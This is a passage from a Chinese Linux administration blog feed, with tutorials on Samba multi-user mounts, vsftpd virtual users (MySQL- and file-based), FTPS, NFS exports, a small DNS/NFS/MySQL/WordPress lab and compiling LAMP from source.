smbpasswd -a feng samba服务器设置目录权限和SELinux 1234]# setfacl –m u:wang:rwx /multiuser]# setfacl –m g:admins:rwx /multiuser]# chcon -R -t samba_share_t /multiuser]# systemctl start smb nmb samba客户端启用多用户挂载 123456789]# yum -y install cifs-utils]# mkdir /mnt/smb]# echo &apos;username=smb1&apos; &gt;/etc/multiuser]# echo &apos;password=centos&apos; &gt;&gt;/etc/multiuser]# chmod 600 /etc/multiuser##以多用户方式挂载：]# vim /etc/fstab//192.168.1.18/smbshare /mnt/smb cifs credentials=/etc/multiuser,multiuser 0 0]# mount -a samba客户端启用多用户访问 12345678910111213]# useradd hong ]# useradd feng]# su - smb1#用root访问]# ls /mnt/smb; touch /mnt/smb/root.txt#用hong访问]# ls /mnt/smb; touch /mnt/smb/hong.txt]# cifscreds add –u hong 192.168.1.18]# touch /mnt/smb/hong.txt#用feng访问]# cifscreds add –u feng 192.168.1.18]# ls /mnt/smb]# touch /mnt/smb/feng.txt]]></content>
      <categories>
        <category>internet</category>
      </categories>
      <tags>
        <tag>server</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[FTP1]]></title>
    <url>%2Fftp1.html</url>
    <content type="text"><![CDATA[摘要：实现基于mysql验证的vsftpd虚拟用户；实现基于SSL的FTPS. 实现基于MYSQL验证的vsftpd虚拟用户 安装依赖 12yum -y groupinstall &quot;Development Tools&quot;yum -y install mariadb-devel pam-devel vsftpd 获取pam-mysql，编译安装pam模块,并将模块安装到/lib64/security 123456]# wget http://prdownloads.sourceforge.net/pam-mysql/pam_mysql-0.7RC1.tar.gz]# tar xf pam_mysql-0.7RC1.tar.gz ]# cd pam_mysql-0.7RC1/]# ./configure --help #查看编译的选项帮助]# ./configure --with-pam-mods-dir=/lib64/security]# make -j 4 &amp;&amp; make install mysql数据库相关配置，创建名为vsftpd.vsftpd的数据库及数据表，存放虚拟用户的用户名及密码。 12345678910111213]# mysql -uroot -ppasswrodcreate database vsftpd;use vsftpdshow tables;create table vsftpd(id int auto_increment primary key,name char(20),pass char(48));create table vsftpd (id int auto_increment primary key,name char(20),pass char(48));desc vsftpd;insert vsftpd(name,pass) values(&apos;ftp1&apos;,password(&apos;centos&apos;)), (&apos;ftp2&apos;,password(&apos;magedu&apos;));select * from vsftpd;grant all on vsftpd.* to vsftpd@&apos;192.168.1.%&apos; identified by &apos;centos&apos;;flush privileges;]# mysql -uvsftpd -pcentos -h192.168.1.18 #远程链接此mysqlserver，测试是否能进入。 vsftpd配置的相关配置。 建立虚拟用户映射的系统用户及对应的目录，注意：需除去ftp根目录的写权限，如果需要其他目录的权限，可以用acl权限来控制。 1234567891011121314]# useradd -r -d /data/ftp -s /sbin/nologin vuser]# mkdir /data/ftp/&#123;upload,pub&#125; -pv]# chown vuser.vuser /data/ftp]# chmod -w /data/ftp]# setfacl -m u:vuser:rwx /data/ftp/upload/]# vim /etc/vsftpd/vsftp.confanonymous_enable=YESguest_enable=YESguest_username=vuserpam_service_name=vsftpd.mysql #原将系统用户无法登录user_config_dir=/etc/vsftpd/vusers.d/]# vim /etc/pam.d/vsftpd.mysql #使用pam模块的验证方式，下面有配置说明auth required pam_mysql.so user=vsftpd passwd=centos host=192.168.1.18 db=vsftpd table=vsftpd usercolumn=name passwdcolumn=pass crypt=2account required pam_mysql.so user=vsftpd passwd=centos host=192.168.1.18 db=vsftpd table=vsftpd usercolumn=name passwdcolumn=pass crypt=2 pam模块验证方式的配置说明 123456789101112• auth 表示认证• account 验证账号密码正常使用• required 表示认证要通过• pam_mysql.so模块是默认的相对路径，是相对/lib64/security/路径而言，也可以写绝对路径；后面为给此模块传递的参数• user=vsftpd为登录mysql的用户• passwd=centos 登录mysql的的密码• host=mysqlserver mysql服务器的主机名或ip地址• db=vsftpd 指定连接msyql的数据库名称• table=vsftpd 指定连接数据库中的表名• usercolumn=name 当做用户名的字段,数据库的用户名的表头• passwdcolumn=pass 当做用户名字段的密码，数据库密码的表头• crypt=2 密码的加密方式为mysql password()函数加密 启动服务，并远程登录ftp进行测试，并在ftp服务器查询相关日志。 123456]# service vsftpd start;systemctl start vsftpd ]# chkconfig vsftpd on;systemctl enable vsftpd]# tail /var/log/secureJun 25 21:58:59 localhost polkitd[707]: Unregistered Authentication Agent for unix-process:11468:4172182 (system bus name :1.65, object path/org/freedesktop/PolicyKit1/AuthenticationAgent, locale en_US.UTF-8) (disconnected from bus) 远程登录ftp服务器测试,虚拟用户登录为mysql-server里vsftpd.vsftpd的用户及密码。 123456789]# ftp 192.168.1.18Connected to 192.168.1.18 (192.168.1.18).220 (vsFTPd 3.0.2)Name (192.168.1.18:root): ftp1331 Please specify the password.Password:230 Login successful.Remote system type is UNIX.Using binary mode to transfer files. 实现基于SSL的FTPS​ 为了提高安全性，我们有 2 种选择，FTPS： 一种多传输协议，相当于加密版的FTP；SFTP：这个协议使用 SSH 文件传输协议加密从客户机到服务器的 FTP 连接，是一种替代 FTPS 的协议是安全文件传输协议(SFTP)。 系统：centos7，虚拟机：VMware Workstation14 抓包工具 安装抓包工具 1]# yum install -y wireshark libpcap 配置ssl前，启动服务，先抓包试一试，然后开始用客户端连接 FTP ，发现明文密码和用户。 12345678910111213]# tshark -ni ens33 -R &quot;tcp.dstport eq 21&quot;tshark: -R without -2 is deprecated. For single-pass filtering use -Y.Running as user &quot;root&quot; and group &quot;root&quot;. This could be dangerous.Capturing on &apos;ens33&apos; 40 9.638793475 192.168.1.16 -&gt; 192.168.1.18 TCP 74 52764 &gt; 21 [SYN] Seq=0 Win=14600 Len=0 MSS=1460 SACK_PERM=1 TSval=2995729 TSecr=0 WS=64 42 9.639132045 192.168.1.16 -&gt; 192.168.1.18 TCP 66 52764 &gt; 21 [ACK] Seq=1 Ack=1 Win=14656 Len=0 TSval=2995730 TSecr=11006002 45 9.644326579 192.168.1.16 -&gt; 192.168.1.18 TCP 66 52764 &gt; 21 [ACK] Seq=1 Ack=21 Win=14656 Len=0 TSval=2995733 TSecr=11006005 46 9.644362705 192.168.1.16 -&gt; 192.168.1.18 FTP 72 Request: FEAT 54 9.645159556 192.168.1.16 -&gt; 192.168.1.18 TCP 66 52764 &gt; 21 [ACK] Seq=7 Ack=50 Win=14656 Len=0 TSval=2995736 TSecr=11006007 56 9.645246021 192.168.1.16 -&gt; 192.168.1.18 TCP 66 52764 &gt; 21 [ACK] Seq=7 Ack=78 Win=14656 Len=0 TSval=2995736 TSecr=11006007 57 9.645584396 192.168.1.16 -&gt; 192.168.1.18 FTP 80 Request: OPTS UTF8 ON 59 9.646038469 192.168.1.16 -&gt; 192.168.1.18 FTP 77 Request: USER ftp1 61 9.646830645 192.168.1.16 -&gt; 192.168.1.18 FTP 79 Request: PASS centos 配置FTPS 查看是否支持SSL 1]# ldd `which vsftpd` |grep ssl 查看到libssl.so 创建自签名证书 123cd /etc/pki/tls/certs/make vsftpd.pemopenssl x509 -in vsftpd.pem -noout –text 配置vsftpd服务支持SSL：/etc/vsftpd/vsftpd.conf 12345ssl_enable=YES #启用SSLallow_anon_ssl=NO #匿名不支持SSLforce_local_logins_ssl=YES #本地用户登录加密force_local_data_ssl=YES #本地用户数据传输加密rsa_cert_file=/etc/pki/tls/certs/vsftpd.pem 在客户端进行访问,客户端使用lftp工具。 1234567]#lftp ftp1@192.168.1.18Password: lftp ftp1@192.168.1.18:~&gt; ls drwxrwxr-x 2 0 0 38 Jun 25 14:00 uploadlftp ftp1@192.168.1.18:/&gt; cd upload/lftp ftp1@192.168.1.18:/upload&gt; ls-rw------- 1 996 993 2242 Jun 25 06:28 Makefile 在服务器端进行抓包，已经是加密的了。1234567891011121314151617181920]# tshark -ni ens33 -R &quot;tcp.dstport eq 21&quot;tshark: -R without -2 is deprecated. For single-pass filtering use -Y.Running as user &quot;root&quot; and group &quot;root&quot;. This could be dangerous.Capturing on &apos;ens33&apos;63 35.579718558 192.168.1.16 -&gt; 192.168.1.18 TCP 74 52762 &gt; 21 [SYN] Seq=0 Win=14600 Len=0 MSS=1460 SACK_PERM=1 TSval=2408883 TSecr=0 WS=6466 35.580304307 192.168.1.16 -&gt; 192.168.1.18 TCP 66 52762 &gt; 21 [ACK] Seq=1 Ack=1 Win=14656 Len=0 TSval=2408883 TSecr=1041711368 35.586512644 192.168.1.16 -&gt; 192.168.1.18 TCP 66 52762 &gt; 21 [ACK] Seq=1 Ack=21 Win=14656 Len=0 TSval=2408889 TSecr=1041711969 35.586526890 192.168.1.16 -&gt; 192.168.1.18 FTP 72 Request: FEAT76 35.586922917 192.168.1.16 -&gt; 192.168.1.18 TCP 66 52762 &gt; 21 [ACK] Seq=7 Ack=54 Win=14656 Len=0 TSval=2408890 TSecr=1041712080 35.587063220 192.168.1.16 -&gt; 192.168.1.18 TCP 66 52762 &gt; 21 [ACK] Seq=7 Ack=82 Win=14656 Len=0 TSval=2408890 TSecr=1041712086 35.587543425 192.168.1.16 -&gt; 192.168.1.18 TCP 66 52762 &gt; 21 [ACK] Seq=7 Ack=133 Win=14656 Len=0 TSval=2408891 TSecr=1041712187 35.587704732 192.168.1.16 -&gt; 192.168.1.18 FTP 76 Request: AUTH TLS90 35.627874000 192.168.1.16 -&gt; 192.168.1.18 TCP 66 52762 &gt; 21 [ACK] Seq=17 Ack=164 Win=14656 Len=0 TSval=2408931 TSecr=1041712191 35.745084236 192.168.1.16 -&gt; 192.168.1.18 FTP 185 Request: \026\003\003\000r\001\000\000n\003\003[1\350\036\344\023\030\a?\033 93 35.745897710 192.168.1.16 -&gt; 192.168.1.18 TCP 66 52762 &gt; 21 [ACK] Seq=136 Ack=1245 Win=16768 Len=0 TSval=2409049 TSecr=10417279 95 35.752492964 192.168.1.16 -&gt; 192.168.1.18 FTP 345 Request: \026\003\003\000\a\v\000\000\003\000\000\000\026\003\003\001\006\020\000\001\002\001\000\241e\227\246\016\233\360b\204\215[CWS\177\322\206&amp;u\270\336\356\331\3534\000\327\364\273\244F\017\3163\016\335\b\313V\324\243\325\\363Z\334&#123;\341\337V\377\210zR1\300\003$\270\225\342 98 35.792069268 192.168.1.16 -&gt; 192.168.1.18 FTP 141 Request: \024\003\003\000\001\001\026\003\003\000@\277\265\366SZ\2507(6\024_n\357\266\373\247\234e\312\246\324\034\355U\230\327~\002\235-\327\347v\232p=\201\373\377\276\2235&#123;%\302\273;\321\251\332\366S=\202W\2048\271\353fs\361\364\217101 35.832569356 192.168.1.16 -&gt; 192.168.1.18 TCP 66 52762 &gt; 21 [ACK] Seq=490 Ack=1320 Win=16768 Len=0 TSval=2409135 TSecr=10417326102 35.832619179 192.168.1.16 -&gt; 192.168.1.18 FTP 135 Request: \027\003\003\000@tG\310\277\202)\266cT\275\036&quot;\026\260\225\311\a\223\266\236\250f\320\326p\357g\a\307\224jHX\315\036\253\377\251\276\224/\263\024\a\006 ,104 35.833041550 192.168.1.16 -&gt; 192.168.1.18 TCP 66 52762 &gt; 21 [ACK] Seq=559 Ack=1389 Win=16768 Len=0 TSval=2409135 TSecr=10417366]]></content>
      <categories>
        <category>FTP</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>SSH</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nfs]]></title>
    <url>%2Fnfs.html</url>
    <content type="text"><![CDATA[摘要：NFS服务，实现基于NFS文件共享的架构共享。 NFS服务 NFS：Network File System 网络文件系统，基于内核的文件系统。Sun公司开发，通过使用NFS，用户和程序可以像访问本地文件一样访问远端系统上的文件，基于RPC（Remote Procedure Call Protocol远程过程调用）实现 RPC采用C/S模式。客户机请求程序调用进程发送一个有进程参数的调用信息到服务进程，然后等待应答信息。在服务器端，进程保持睡眠状态直到调用信息到达为止。当一个调用信息到达，服务器获得进程参数，计算结果，发送答复信息，然后等待下一个调用信息，最后，客户端调用进程接收答复信息，获得进程结果，然后调用执行继续进行。 NFS优势：节省本地存储空间，将常用的数据如：home目录,存放在一台NFS服务器上且可以通过网络访问，那么本地终端将可以减少自身存储空间的使用 软件包：nfs-utilsKernel支持:nfs.ko端口：2049(nfsd), 其它端口由portmap(111)分配配置文件：/etc/exports, /etc/exports.d/*.exportsCentOS7不支持同一目录同时用nfs和samba共享，因为使用锁机制不同相关软件包:rpcbind（必须），tcp_wrappersCentOS6开始portmap进程由rpcbind代替NFS服务主要进程：1234rpc.nfsd 最主要的NFS进程，管理客户端是否可登录rpc.mountd 挂载和卸载NFS文件系统，包括权限管理rpc.lockd 非必要，管理文件锁，避免同时写出错rpc.statd 非必要，检查文件一致性，可修复文件 日志：/var/lib/nfs/ 导出的文件系统的格式：/dir 主机1(opt1,opt2) 主机2(opt1,opt2)… #开始为注释 主机格式：1234567单个主机：ipv4，ipv6，FQDNIP networks：两种掩码格式均支持172.18.0.0/255.255.0.0172.18.0.0/16wildcards：主机名通配，例如*.magedu.com，IP不可以netgroups：NIS域的主机组，@group_nameanonymous：表示使用*通配所有客户端 每个条目指定目录导出到的哪些主机，及相关的权限和选项12345678910默认选项：(ro,sync,root_squash,no_all_squash)ro,rw 只读和读写async 异步，数据变化后不立即写磁盘，性能高sync（1.0.0后为默认）同步，数据在请求时立即写入共享no_all_squash （默认）保留共享文件的UID和GIDall_squash 所有远程用户(包括root)都变成nfsnobodyroot_squash （默认）远程root映射为nfsnobody,UID为65534，早期版本是4294967294 (nfsnobody)no_root_squash 远程root映射成root用户anonuid和anongid 指明匿名用户映射为特定用户UID和组GID，而非nfsnobody,可配合all_squash使用 操作性实验 exportfs专门管理nfs系统，/etc/exports安装系统时自带，由setup包提供。 12345678910]#rpm -qf /etc/exports setup-2.8.14-23.el6.noarch]#sytemtcl restart nfs-server]# vim /etc/exports/app/nfsdir1 */app/nfsdir2 *(rw)]#exportfs -f]#exportfs -v/app/nfsdir1 &lt;world&gt;(ro,sync,wdelay,hide,no_subtree_check,sec=sys,secure,root_squash,no_all_squash)/app/nfsdir2 &lt;world&gt;(rw,sync,wdelay,hide,no_subtree_check,sec=sys,secure,root_squash,no_all_squash) 服务授权 12setfacl -m u:nfsnobody:rwx /app/nfsdir2 #授权远程的root账户。setfacl -m u:65534:rwx /app/nfsdir2 远程挂载 123456&#125;# yum install nfs-utils -y ]# showmount -e 192.168.1.18Export list for 192.168.1.18:/app/nfsdir1 */app/nfsdir2 192.168.1.16]# mount 192.168.1.18:/ /mnt/nfs1/ 实现基于NFS文件共享的架构共享。实现如下拓扑图： 场景：客户端访问www.hongfeng.io,会向DNSserver询问ip，然后DNSserver返回域名的IP，然后才能访问web服务器的资源。web服务器的资源比如wordpress存于NFS-server上，数据管理存于mysql后台数据库服务器上。实现了一个简单httpd+DNS+mysql+nfs服务架构。 试验准备： 1hostnamectl set-hostname DNSserver 基于centos6和centos7搭建。 12345678910---------------------------------------centos6：2.6.32-696.el6.x86_64client：172.20.114.144 DNSserver：172.20.114.139mysql: 172.20.114.145web+phpserever: 172.20.114.146 172.20.114.147实现小的均衡负载，但是这种DNS解析的辅助均衡并不可靠，不过有更专业的lvs,haproxy还以nginx都可以实现。---------------------------------------centos7: 3.10.0-862.el7.x86_64NFSserver: 172.20.5.24 DNS-server的搭建DNS的主机IP为172.20.114.139，配置DNS服务器，需要首先下载bind包，然后再配置/etc/named.conf文件，允许本地和其他人访问；其次，增加需要解析的zone文件，在/etc/named.rfc1912.zones配置，注意zone是域名，不用带www；最后是/var/named/*.zone资源配置文件；注意 ，需要改变新增的zone资源配置文件的所属组；启动服务。具体配置如下： 1234567891011121314151617181920212223242526]# yum -y install bind ]# vim /etc/named.confoptions &#123;// listen-on port 53 &#123; 127.0.0.1; &#125;;// allow-query &#123; localhost; &#125;;···]# vim /etc/named.rfc1912.zoneszone &quot;hongfeng.io&quot; IN &#123; type master; file &quot;named.hongfeng.zone&quot;; &#125;;]# vim /var/named/named.hongfeng.zone $TTL 1D@ IN SOA dns.hongfeng.io. admin.hongfeng.io. ( 0 ; serial 1D ; refresh 1H ; retry 1W ; expire 3H ) ; minimum NS dns.hongfeng.io.dns A 172.20.114.139web A 172.20.114.147 web A 172.20.114.146 www CNAME web]# chgrp named /var/named/named.hongfeng.zone ]# systemctl start named mysql服务器的搭建试验的mysql服务器ip为172.20.114.145。首先安装mysql-server，再创建数据库及授权服务器的数据库管理。注意，这里授权的是给web+php服务器，虽然wordpress存于NFS服务器上，但是用户访问的时候，*.php的文件都会转发给PHP程序来解析，所以，wordpress的数据库授权应该给web+php服务器. 123456789]# yum install mysql-server -y]# service mysqld start]# chkconfig mysqld on]# mysqlcreate database wpdb;use wpdb;grant all on wpdb.* to wpuser@&apos;172.20.114.147&apos; identified by &apos;centos&apos;;grant all on wpdb.* to wpuser@&apos;172.20.114.146&apos; identified by &apos;centos&apos;;flush privileges; NFS服务器的搭建试验的NFS服务器ip为172.20.5.24，这里是存放数据的服务器，先下载wordpress资源，建立资源存放文件比如/data/,将 12345678910111213]# [ -f wordpress-4.9.4-zh_CN.tar.gz ] || wget https://cn.wordpress.org/wordpress-4.9.4-zh_CN.tar.gz]# [ -d /data ] || mkdir /data]# tar xf wordpress-4.9.4-zh_CN.tar.gz -C /data/]# cd /data/wordpress]# cp wp-config-sample.php wp-config.php]# sed -i &quot;s/database_name_here/wpdb/&quot; wp-config.php]# sed -i &quot;s/username_here/wpuser/&quot; wp-config.php]# sed -i &quot;s/password_here/centos/&quot; wp-config.php]# sed -i &quot;s/localhost/172.20.114.145/&quot; wp-config.php]# yum install nfs-utils -y]# vim /etc/exports/data/wordpress 172.20.114.146(rw) 172.20.114.147(rw)]# systemctl start nfs-server web1+php和web2+php主机的搭建这两台的试验主机的IP分别为：172.20.114.14[6,7],安装相关服务，挂载NFS服务器资源即可。 1234]# yum install -y httpd php php-mysql nfs-utils]# service httpd start ]# showmount -e 172.20.5.24]# mount 172.20.5.24:/data/wordpress /var/www/html client的设置及访问1234567891011121314151617181920212223242526272829]# vim /etc/resolv.confnameserver 172.20.114.139]# dig www.hongfeng.io; &lt;&lt;&gt;&gt; DiG 9.9.4-RedHat-9.9.4-61.el7 &lt;&lt;&gt;&gt; www.hongfeng.io;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 31025;; flags: qr aa rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 1, ADDITIONAL: 2;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 4096;; QUESTION SECTION:;www.hongfeng.io. IN A;; ANSWER SECTION:www.hongfeng.io. 86400 IN CNAME web.hongfeng.io.web.hongfeng.io. 86400 IN A 172.20.114.147web.hongfeng.io. 86400 IN A 172.20.114.146;; AUTHORITY SECTION:hongfeng.io. 86400 IN NS dns.hongfeng.io.;; ADDITIONAL SECTION:dns.hongfeng.io. 86400 IN A 172.20.114.139;; Query time: 1 msec;; SERVER: 172.20.114.139#53(172.20.114.139);; WHEN: Tue Jun 26 14:09:51 CST 2018;; MSG SIZE rcvd: 128 结语：​ 出现配置好的A记录及CNAME记录,说明DNS解析完成，现在开始访问http://www.hongfeng.io/,实现了均衡负载。并且搭建了NFS文件服务器和mysql数据库服务器。一个简简单单的小架构搭建完毕。 ​ 几台服务器构成了一个算是小小的架构，是一个小实验，综合理解了DNS，NFS，httpd，php等程序的运作。]]></content>
      <categories>
        <category>nfs</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Server</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[FTP]]></title>
    <url>%2Fftp.html</url>
    <content type="text"><![CDATA[摘要：FTP的简介；vsftpd的相关应用；实现基于文件验证的vsftpd虚拟用户 FTP介绍 File Transfer Protocol 早期的三个应用级协议之一 应用级协议：http smtp ftp 基于C/S结构 双通道协议：数据和命令连接 数据传输格式：二进制（默认）和文本 两种模式：服务器角度 主动(PORT style)：服务器主动连接，通过command告诉服务器数据端口 12命令（command）：客户端：随机port --- 服务器：tcp21数据：客户端：随机port ---服务器：tcp20 被动(PASV style)：客户端主动连接，通过command告诉客户端数据端口12命令（控制）：客户端：随机port --- 服务器：tcp21数据：客户端：随机port ---服务器：随机port 服务器被动模式数据端口示例： 12345ftp&gt; ls227 Entering Passive Mode (172,20,0,1,44,250).150 Here comes the directory listing.drwxr-xr-x 21 0 0 4096 Apr 09 10:44 pub服务器数据端口为：44*256+250 状态码 123451XX：信息 125：数据连接打开2XX：成功类状态 200：命令OK 230：登录成功3XX：补充类 331：用户名OK4XX：客户端错误 425：不能打开数据连接5XX：服务器错误 530：不能登录 用户认证： 123456匿名用户：ftp,anonymous,对应Linux用户ftp系统用户：Linux用户,用户/etc/passwd,密码/etc/shadow虚拟用户：特定服务的专用用户，独立的用户/密码文件 nsswitch:network service switch 名称解析框架 pam:pluggable authentication module 用户认证 /lib64/security /etc/pam.d/ /etc/pam.conf vsftpd 由vsftpd包提供不再由xinetd管理用户认证配置文件:/etc/pam.d/vsftpd服务脚本： /usr/lib/systemd/system/vsftpd.service/etc/rc.d/init.d/vsftpd配置文件:/etc/vsftpd/vsftpd.confman 5 vsftpd.conf格式：option=value注意：= 前后不要有空格匿名用户（映射为系统用户ftp ）共享文件位置：/var/ftp系统用户共享文件位置：用户家目录虚拟用户共享文件位置：为其映射的系统用户的家目录 被动模式端口范围，只允许10个端口打开。 1234ftp_data_port=2020pasv_min_port=6000 0为随机分配pasv_max_port=6010use_local_time 匿名用户 123456789101112anonymous_enable=YES 支持匿名用户 no_anon_password=YESanon_world_readable_only 只能下载全部读的文件#给ftp上传修改权限anon_upload_enable=YES 匿名上传，注意:文件系统权限setfacl -m u:ftp:rwx /vat/ftp/pupanon_mkdir_write_enable=YESanon_umask=077 指定匿名上传文件的umaskanon_other_write_enable=YES 可删除和修改上传的文件#指定上传文件的默认的所有者和权限chown_uploads=YES(默认NO)chown_username=wangchown_upload_mode=0644 系统用户的设置 123456789101112guest_enable=YES #所有系统用户都映射成guest用户guest_username=ftp #配合上面选项才生效，指定guest用户，local_enable=YES #是否允许linux用户登录write_enable-YES #允许linux用户上传文件local_umask=022 #指定系统用户上传文件的默认权限local_root=/ftproot #非匿名用户登录所在目录。##禁锢所有系统用户在家目录中chroot_local_user=YES #（默认NO，不禁锢）禁锢系统用户##禁锢或不禁锢特定的系统用户在家目录中，与上面设置功能相反chroot_list_enable=YES chroot_list_file=/etc/vsftpd/chroot_list#当chroot_local_user=YES时，则chroot_list中用户不禁锢#当chroot_local_user=NO时，则chroot_list中用户禁锢 wu-ftp日志：默认启用 123xferlog_enable=YES （默认）启用记录上传下载日志xferlog_std_format=YES （默认）使用wu-ftp日志格式xferlog_file=/var/log/xferlog （默认）可自动生成 vsftpd日志：默认不启用 12dual_log_enable=YES 使用vsftpd日志格式，默认不启用vsftpd_log_file=/var/log/vsftpd.log（默认）可自动生成 登录提示信息 123ftpd_banner=&quot;welcome to mage ftp server&quot;banner_file=/etc/vsftpd/ftpbanner.txt 优先上面项生效^[[1;5;32mwelcome to my ftp server^[[0m 目录访问提示信息 12dirmessage_enable=YES (默认)message_file=.message(默认)信息存放在指定目录下.message pam模块 12345678910111213使用pam(Pluggable Authentication Modules)完成用户认证pam_service_name=vsftpdpam配置文件:/etc/pam.d/vsftpd/etc/vsftpd/ftpusers 默认文件中用户拒绝登录是否启用控制用户登录的列表文件userlist_enable=YES 默认有此设置userlist_deny=YES(默认值)黑名单,不提示口令，NO为白名单userlist_file=/etc/vsftpd/users_list 此为默认值连接限制max_clients=0 最大并发连接数max_per_ip=0 每个IP同时发起的最大连接数vsftpd服务指定用户身份运行nopriv_user=nobody 实现基于文件验证的vsftpd虚拟用户 创建虚拟用户文件，以后远程登录ftp服务器的用户及密码保存文件点。 123456789101112]# cd /etc/vsftpd/]# cp vsftpd.conf vsftpd.conf.bak]# vim vsftpusersftpuser1centosftpuser2hongftpuser3rhel]# db_load -T -t hash -f vsftpusers vsftpusers.db]# file vsftpusers.db ]# chmod 600 vsftpusers 创建系统的虚拟用户，远程登录用户映射成为系统虚拟用户。 12345]# useradd -r -d /data/ftp -s /sbin/nologin vuser]# mkdir /data/ftp/upload]# chown -R vuser.vuser /data/ftp]# setfacl -m u:vuser:rwx upload/]# chmod -w /data/ftp 配置vsftpd服务器，有pam模块认证，有授权映射虚拟用户。设置不同虚拟用户对应的相应配置文件不同，ftpuser1实现能上传文件，ftpuser2实现家目录为/ftproot。 123456789101112131415161718]# vim /etc/pam.d/vsftpd.dbauth required pam_userdb.so db=/etc/vsftpd/vsftpusersaccount required pam_userdb.so db=/etc/vsftpd/vsftpusers]# vim /etc/vsftpd/vsftp.confguest_enable=YESguest_username=vuserpam_service_name=vsftpd.dbuser_config_dir=/etc/vsftpd/vusers.d/ ]# mkdir vusers.d]# vim vusers.d/ftpuser1anon_upload_enable=YESanon_mkdir_write_enable=YESanon_other_write_enable=YES]# vim vusers.d/ftp2local_root=/ftproot]# mkdir /ftproot]# touch /ftproot/test]# systemctl restart vsftpd 进行试验,远程链接ftp服务器，以ftpuser1登录，能上传文件，以ftpuser2登录，家目录为/ftproot。 12345678910111213141516171819202122232425262728293031323334353637383940]#ftp 192.168.1.18Connected to 192.168.1.18 (192.168.1.18).220 (vsFTPd 3.0.2)Name (192.168.1.18:root): ftpuser1331 Please specify the password.Password:230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; pwd257 &quot;/&quot;ftp&gt; cd upload250 Directory successfully changed.ftp&gt; pwd257 &quot;/upload&quot;ftp&gt; !lsca-bundle.crt ca-bundle.trust.crt make-dummy-cert Makefile renew-dummy-certftp&gt; put Makefilelocal: Makefile remote: Makefile227 Entering Passive Mode (192,168,1,18,101,13).150 Ok to send data.226 Transfer complete.]#ftp 192.168.1.18Connected to 192.168.1.18 (192.168.1.18).220 (vsFTPd 3.0.2)Name (192.168.1.18:root): ftpuser2331 Please specify the password.Password:230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; pwd257 &quot;/&quot;ftp&gt; cd upload250 Directory successfully changed.ftp&gt; ls227 Entering Passive Mode (192,168,1,18,66,111).150 Here comes the directory listing.-rw-r--r-- 1 0 0 0 Jun 25 06:31 test226 Directory send OK.]]></content>
      <categories>
        <category>FTP</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LAMP2]]></title>
    <url>%2FLamp2.html</url>
    <content type="text"><![CDATA[摘要：centos7编译安装lamp；实现多虚拟主机wordpress，discuz；一键编译安装lamp脚本 centos7 编译安装lamp源码获取1234567]# wget http://mirrors.tuna.tsinghua.edu.cn/apache//apr/apr-1.6.3.tar.gz]# wget http://mirrors.tuna.tsinghua.edu.cn/apache//apr/apr-util-1.6.1.tar.gz]# wget https://archive.apache.org/dist/httpd/httpd-2.4.33.tar.bz2]# wget http://mirrors.sohu.com/php/php-7.1.18.tar.bz2]# wget https://cn.wordpress.org/wordpress-4.9.4-zh_CN.tar.gz]# wget http://download.comsenz.com/DiscuzX/3.3/Discuz_X3.3_SC_UTF8.zip]# wget ftp://172.20.0.1/pub/Sources/sources/mariadb/mariadb-10.2.15-linux-x86_64.tar.gz 相关依赖安装123456#包组依赖yum groupinstall &apos;Development Tools&apos;#httpd依赖yum install pcre-devel apr-devel apr-util-devel openssl-devel -y#php依赖yum install libxml2-devel bzip2-devel libmcrypt-devel -y 编译安装httpd1234567891011121314151617]# tar xf apr-1.6.3.tar.gz ]# tar xf apr-util-1.6.1.tar.gz ]# tar xf httpd-2.4.33.tar.bz2]# mv apr-1.6.3 httpd-2.4.33/srclib/apr]# mv apr-util-1.6.1 httpd-2.4.33/srclib/apr-util/]# ./configure --prefix=/app/httpd24 \--enable-so \--enable-ssl \--enable-cgi \--enable-rewrite \--with-zlib \--with-pcre \--with-included-apr \--enable-modules=most \--enable-mpms-shared=all \--with-mpm=prefork]# make -j4 &amp;&amp; make install mariadb二进制安装可以参考博主前面mysql博文，数据库的路径规划为/data/mysqld。 12345678910111213]# id mysql &amp;&gt; /dev/null || useradd -r -d /data/mysqldb -s /sbin/nologin mysql]# mkdir /data/mysqldb -pv &amp;&amp; chown mysql.mysql /data/mysqldb &amp;&amp; chmod 770 /data/mysqldb]# tar xf mariadb-10.2.15-linux-x86_64.tar.gz -C /usr/local]# cd /usr/local]# ln -s mariadb-10.2.15-linux-x86_64/ mysql &amp;&amp; chown -R root:mysql /usr/local/mysql/]# cd /usr/local/mysql/]# scripts/mysql_install_db --datadir=/data/mysqldb --user=mysql]# cp /usr/local/mysql/support-files/my-huge.cnf /etc/my.cnf]# sed -i &apos;/\[mysqld\]/a\datadir=/data/mysqldb&apos; /etc/my.cnf]# cp /usr/local/mysql/support-files/mysql.server /etc/init.d/mysqld]# service mysqld start]# mysql -e &apos;create database wpdb&apos;]# mysql -e &quot;grant all on wpdb.* to wpuser@&apos;192.168.1.%&apos; identified by &apos;centos&apos;&quot; 编译安装fastcgi模式php123456789101112131415161718192021222324252627282930]# tar xvf php-7.1.18.tar.bz2]# cd php-7.1.18/./configure --prefix=/app/php \--enable-mysqlnd \--with-mysqli=mysqlnd \--with-openssl \--with-pdo-mysql=mysqlnd \--enable-mbstring \--with-freetype-dir \--with-jpeg-dir \--with-png-dir \--with-zlib \--with-libxml-dir=/usr \--enable-xml \--enable-sockets \--enable-fpm \--with-config-file-path=/etc \--with-config-file-scan-dir=/etc/php.d \--enable-maintainer-zts \--disable-fileinfo]# cp php.ini-production /etc/php.ini]# cp sapi/fpm/init.d.php-fpm /etc/init.d/php-fpm]# chmod +x /etc/init.d/php-fpm]# cd /app/php/etc]# cp php-fpm.conf.default php-fpm.conf]# cp php-fpm.d/www.conf.default php-fpm.d/www.conf]# vim php-fpm.d/www.confuser = apachegroup = apache]# service php-fpm start 配置httpd支持php12345678910111213]# vim 